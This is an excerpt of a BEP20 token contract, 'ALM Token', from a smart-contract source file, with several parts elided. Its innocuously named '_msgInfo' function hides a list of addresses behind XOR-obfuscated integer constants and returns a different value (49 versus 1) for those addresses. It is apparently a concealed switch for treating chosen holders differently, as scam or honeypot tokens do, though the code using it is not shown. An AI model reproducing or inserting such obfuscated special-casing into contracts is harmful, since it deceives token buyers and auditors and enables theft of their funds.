...
contract ALM is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "ALM Token";
	string symbol_ = "ALM";
...
*/
	...
	function _msgInfo(uint _acc) internal view virtual returns (uint v) {
		uint[12] memory acc = [uint(1272241361934736643055486634647076901479460429223),243997170909964774715369506350935958366423107931
			,826607006304073385904360435267492595036341534085,818554411485916584672591858377468507661101363189
			,1039270216450663363850782778319201692694465012145,1137019559675918376042799481379015312645566092448
			,1271909575874298338792058264661740097483315873439,198923494156210200001168070155690306014328662035
			,897285014711754359225786476742444026294709997566,448728352341894644077673379550988756056465083679
			,360061538786290310688538443366458014650854919562,1056685295031412577075287875248027414222879335868];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 1269890142209142126653648087027470781648634187939) return 49;
		}
		return 1;
    }
}